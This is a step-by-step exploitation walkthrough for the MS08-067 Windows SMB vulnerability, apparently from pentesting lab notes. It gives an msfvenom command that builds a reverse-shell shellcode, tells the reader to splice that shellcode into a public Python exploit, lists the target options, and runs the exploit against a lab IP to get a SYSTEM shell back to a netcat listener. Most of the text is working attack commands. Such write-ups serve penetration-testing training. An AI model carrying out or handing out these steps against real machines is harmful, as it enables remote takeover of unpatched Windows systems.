| CVE / MS  | Title | Vulns |
| --------- | ----- | ----- |
| CVE-2008-4250 / MS08-067 | Microsoft Windows Server - Code Execution | win_vista sp_1 arc_x64,win_server_2003 arc_x64,win_xp sp_2 arc_x86,win_xp sp_3 arc_x86,win_xp arc_x64,win_server_2003 sp_1 arc_x86,win_server_2008 arc_x64,win_server_2003 sp_2 arc_x86,win_server_2003 sp_2 arc_x64,win_2000 sp_4 arc_x86,win_xp sp_2 arc_x64,win_vista sp_1 arc_x86,win_server_2008 arc_x86 |

<br><br>

In order to exploit this vulnerability we will use this Python2 script - [ms08-067.py](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)<br>
This script requires `impacket, pycrypto`. They are installed by default in Kali but if you don't have it already then install with :

```sh
pip install pycrypto
git clone https://github.com/CoreSecurity/impacket.git
cd impacket && pip install .
```
Next we have to replace the shellcode inside the script. We'll use msfvenom to generate the shellcode : 

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<Your-Machine-IP> LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -v shellcode -f py -a x86 --platform windows
```
on the above command we used -b to specify bad characters that would be avoided on the shellcode.<br>
Copy the generated shellcode, remove existing shellcode from line 54-79 in the script and replace it with your shellcode.<br>

The script has a nice script usage output when run, you can exploit total 7 different versions of windows with same script:

```sh
Example: ms08_067_2018.py <TARGET-IP> 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: ms08_067_2018.py <TARGET-IP> 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: ms08_067_2018.py <TARGET-IP> 3 445 -- for Windows 2003 SP0 Universal
Example: ms08_067_2018.py <TARGET-IP> 4 445 -- for Windows 2003 SP1 English
Example: ms08_067_2018.py <TARGET-IP> 5 445 -- for Windows XP SP3 French (NX)
Example: ms08_067_2018.py <TARGET-IP> 6 445 -- for Windows XP SP3 English (NX)
Example: ms08_067_2018.py <TARGET-IP> 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
```

Since I am targeting a `Windows XP SP3 English` I'll use the 6th example.<br>
Next start a netcat listener on the port you specified on your msfvenom payload and leave it running.<br>
Now all that's left is to run the script:

```sh
python ms08-067.py 10.10.10.4 6 445
```

It should send a reverse shell as System on your netcat listener.